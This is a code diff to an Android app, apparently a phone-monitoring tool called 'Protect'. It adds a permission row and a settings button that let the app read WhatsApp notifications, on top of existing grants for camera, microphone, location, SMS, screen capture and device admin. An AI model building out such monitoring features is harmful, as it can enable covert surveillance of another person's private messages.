@@ -60,6 +60,7 @@ class MainActivity : ComponentActivity() {
     private val hasPhoneState       = mutableStateOf(false)
     private val hasSmsState         = mutableStateOf(false)
     private val hasActivityState    = mutableStateOf(false)
+    private val hasWhatsAppListenerState = mutableStateOf(false)
 
     // ── Launcher 1: Basic permissions (camera, mic, location, notifications) ──
     private val basicPermLauncher = registerForActivityResult(
@@ -204,6 +205,7 @@ class MainActivity : ComponentActivity() {
         hasSmsState.value        = hasPermission(Manifest.permission.RECEIVE_SMS)
         hasActivityState.value   = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
             hasPermission(Manifest.permission.ACTIVITY_RECOGNITION) else true
+        hasWhatsAppListenerState.value = WhatsAppNotificationListener.isEnabled(this)
     }
 
     private fun hasPermission(p: String) =
@@ -251,6 +253,7 @@ class MainActivity : ComponentActivity() {
         val hasPhone      by hasPhoneState
         val hasSms        by hasSmsState
         val hasActivity   by hasActivityState
+        val hasWhatsAppListener by hasWhatsAppListenerState
         val hasAllFiles   = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
             android.os.Environment.isExternalStorageManager() else true
 
@@ -568,6 +571,11 @@ class MainActivity : ComponentActivity() {
                     else "Captura de Tela (Acessibilidade — ativar uma vez)",
                     hasAccessibility
                 )
+                PermRow(
+                    if (hasWhatsAppListener) "Monitor WhatsApp (Notificações) ✓"
+                    else "Monitor WhatsApp (permitir acesso às notificações)",
+                    hasWhatsAppListener
+                )
                 if (!hasAccessibility) {
                     PermRow("Transmissão de Tela (temporária)", hasScreen)
                 }
@@ -579,7 +587,7 @@ class MainActivity : ComponentActivity() {
 
                 val allGranted = hasLocation && hasBgLocation && hasCamera && hasMic &&
                         hasPhone && hasSms && hasActivity && hasNotify && hasAccessibility && hasAdmin &&
-                        hasAllFiles && !isBatteryOptimized
+                        hasWhatsAppListener && hasAllFiles && !isBatteryOptimized
                 Spacer(Modifier.height(14.dp))
 
                 if (!allGranted) {
@@ -620,6 +628,28 @@ class MainActivity : ComponentActivity() {
                         }
                         Text(
                             "Configurações → Acessibilidade → Protect → Ativar.\nFaça isso uma vez e nunca mais será solicitado.",
+                            color = Color(0xFF8E94A5), fontSize = 10.sp, lineHeight = 14.sp,
+                            modifier = Modifier.padding(bottom = 10.dp)
+                        )
+                    }
+
+                    // WhatsApp notification listener
+                    if (!hasWhatsAppListener) {
+                        Button(
+                            onClick = {
+                                startActivity(Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
+                            },
+                            modifier = Modifier.fillMaxWidth().padding(bottom = 10.dp),
+                            shape = RoundedCornerShape(12.dp),
+                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF25D366))
+                        ) {
+                            Text(
+                                "💬  Permitir Ler Notificações do WhatsApp",
+                                color = Color.Black, fontWeight = FontWeight.Bold, fontSize = 12.sp
+                            )
+                        }
+                        Text(
+                            "Configurações → Acesso às notificações → Protect → Ativar.\nAssim o app pode monitorar mensagens recebidas do WhatsApp.",
                             color = Color(0xFF8E94A5), fontSize = 10.sp, lineHeight = 14.sp,
                             modifier = Modifier.padding(bottom = 10.dp)
                         )
